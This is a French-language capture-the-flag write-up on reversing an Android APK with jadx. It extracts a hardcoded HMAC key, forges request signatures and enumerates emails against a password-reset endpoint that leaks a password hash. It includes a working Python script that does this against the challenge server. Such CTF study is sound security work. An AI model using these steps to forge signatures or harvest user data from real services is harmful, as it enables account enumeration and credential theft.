# Writeup Template

## Approach
J’ai initialement décompilé l’APK fourni avec jadx afin d’analyser son fonctionnement interne.
En explorant le code, j’ai identifié les appels à l’API ainsi qu’un mécanisme de protection basé sur une signature HMAC.

J’ai d’abord tenté d’interagir avec l’endpoint /auth/login via un script Python (requests), mais la requête a été rejetée car elle n’était pas signée.

En analysant davantage le code avec jadx, j’ai identifié une classe responsable de la génération de la signature HMAC. La clé secrète était hardcodée dans l’application, ce qui permettait de reproduire le mécanisme de signature côté client.

J’ai ensuite testé les emails fournis dans le challenge afin d’identifier un utilisateur valide. Un seul email retournait une réponse différente :
melissajohnson@example.net

Enfin, j’ai analysé les endpoints disponibles et identifié /auth/password-reset comme particulièrement intéressant, car il retourne un objet UserResponse contenant des informations sensibles lorsqu’une requête valide est envoyée.

```Java
    @POST("auth/password-reset")
    Call<UserResponse> passwordReset(@Body PasswordResetRequest passwordResetRequest);
```

```Java
public class UserResponse {
    private UserModel user;

    public UserModel getUser() {
        return this.user;
    }
}
```

```
    public UserModel(int i, String str, String str2, String str3) {
        this.id = i;
        this.username = str;
        this.email = str2;
        this.passwordHash = str3;
    }
....

```

## Solution
1. Reverse de l’APK avec jadx
- Récupération de la clé HMAC :
```Java
public class HMACSignature {
    private static final String HMAC_ALGORITHM = "HmacSHA256";
    private static final String HMAC_KEY = "e98be7e6af2a689df910405d344370ff088accad0cd129f120cb37c104b72d9e";
```

2. Bruteforce des emails fournis par le chall  
3. Reproduction de la signature HMAC
- Compréhension du mécanisme :
```python
signature = HMAC(secret_key, body)
Génération correcte de la signature pour des requêtes personnalisées
```

4. Identification d’un endpoint vulnérable

- Endpoint qui expose des information sensibles:
```JAVA
    @POST("auth/password-reset")
    Call<UserResponse> passwordReset(@Body PasswordResetRequest passwordResetRequest);
```

## Key Insights
- La clé HMAC ne doit jamais être stockée côté client
- Un endpoint de reset password ne doit jamais retourner d’informations sensibles
- Une différence de réponse permet l’énumération d’utilisateurs
- Combiner reverse engineering + API abuse est très efficace en CTF mobile

## Tools
- JADX (décompilation APK)
- strings (extraction rapide de données)
- Python (requests, hmac, hashlib)
- Genymotion (émulation Android)

## Code

```python
import requests
import hmac
import hashlib
import json
import urllib3

urllib3.disable_warnings()

URL = "https://worker01.flag4jobs.live:11089/auth/password-reset"
KEY = b"e98be7e6af2a689df910405d344370ff088accad0cd129f120cb37c104b72d9e"

def sign(data):
    return hmac.new(KEY, data.encode(), hashlib.sha256).hexdigest()

emails = [
    "bholmes@example.org",
    "brownkelli@example.net",
    "erincastillo@example.net",
    "ericgallagher@example.org",
    "ujones@example.net",
    "ronaldmartinez@example.net",
    "gibsonmichelle@example.net",
    "wquinn@example.org",
    "tbennett@example.com",
    "ryan06@example.net",
    "billy83@example.org",
    "tuckerjillian@example.org",
    "hhernandez@example.net",
    "brandy33@example.org",
    "awatkins@example.org",
    "melissa21@example.org",
    "christineford@example.com",
    "thomas23@example.org",
    "cgoodwin@example.net",
    "mobrien@example.org",
    "pmiddleton@example.com",
    "rubenjimenez@example.net",
    "michael49@example.net",
    "gonzalezamy@example.com",
    "stephanie76@example.net",
    "masonkevin@example.net",
    "jkirk@example.com",
    "martinkimberly@example.com",
    "reedjenny@example.com",
    "rileybrian@example.net",
    "sharonmcdonald@example.net",
    "chad03@example.org",
    "kennethbarton@example.org",
    "teresamatthews@example.org",
    "melissanoble@example.org",
    "spencermelissa@example.net",
    "thomaserickson@example.net",
    "jessica94@example.com",
    "orozcobonnie@example.net",
    "anna74@example.com",
    "martintravis@example.net",
    "anthonymcgrath@example.org",
    "bryangordon@example.org",
    "jeffrey29@example.com",
    "pgeorge@example.net",
    "richardsdakota@example.net",
    "zknight@example.net",
    "emily57@example.net",
    "dhodge@example.org",
    "shannon11@example.com",
    "gravesandrew@example.net",
    "jmontoya@example.net",
    "nmunoz@example.com",
    "melissajohnson@example.net",
    "morganjoseph@example.org",
    "elizabethsmith@example.net",
    "jerry93@example.net"
]

for email in emails:
    body = json.dumps({"email": email}, separators=(',', ':'))
    signature = sign(body)

    headers = {
        "Content-Type": "application/json",
        "X-Signature": signature
    }

    try:
        r = requests.post(URL, data=body, headers=headers, verify=False)

        print(f"[{email}] -> {r.status_code}")

        # détecter le bon user
        if "Unable to find user" not in r.text:
            print("\n FOUND VALID USER ")
            print("Email:", email)
            print("Response:", r.text)
            break

    except Exception as e:
        print(f"Error with {email}: {e}")
```
